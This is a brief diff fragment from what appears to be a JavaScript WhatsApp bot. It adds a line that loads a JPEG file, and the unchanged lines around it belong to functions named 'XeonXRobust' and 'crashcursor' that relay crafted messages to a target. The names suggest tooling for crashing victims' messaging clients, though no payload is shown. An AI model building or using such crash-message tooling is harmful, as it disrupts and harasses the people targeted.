@@ -1552,6 +1552,7 @@ async function XeonXRobust(target, Ptcp = true) {
 
     cella.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
 }
+const tdxlol = fs.readFileSync('./tdx.jpeg')
 const crypto = require('crypto');
 async function crashcursor(target, ptcp = true) {
 const stanza = [
